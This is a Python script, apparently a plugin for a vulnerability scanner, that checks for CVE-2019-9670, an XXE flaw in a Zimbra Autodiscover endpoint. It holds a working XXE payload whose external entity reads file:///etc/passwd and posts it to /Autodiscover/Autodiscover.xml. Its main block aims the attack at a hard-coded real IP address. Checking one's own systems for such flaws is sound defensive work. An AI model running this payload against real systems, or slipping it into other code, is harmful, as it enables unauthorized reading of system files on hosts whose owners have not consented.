#!/usr/bin/env python3

'''
name: CVE-2019-9670 XXE读取漏洞
description: CVE-2019-9670 XXE读取漏洞
'''

import re
from app.lib.utils.request import request

class CVE_2019_9670_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
            "Content-Type":"application/xml"
            }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        data = """<!DOCTYPE xxe [
        <!ELEMENT name ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
         <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
            <Request>
              <EMailAddress>aaaaa</EMailAddress>
              <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
            </Request>
          </Autodiscover>
        """
        try:
            req = request.post(self.url + '/Autodiscover/Autodiscover.xml', headers = self.headers, data = data)
            if 'Error 503 Requested response schema not available' in req.text:
                print('存在CVE-2019-9670 XXE读取漏洞')
                return True
            else:
                print('不存在CVE-2019-9670 XXE读取漏洞')
                return False
        except Exception as e:
            #print(e)
            print('不存在CVE-2019-9670 XXE读取漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2019_9670 = CVE_2019_9670_BaseVerify('https://193.87.11.178')
    CVE_2019_9670.run()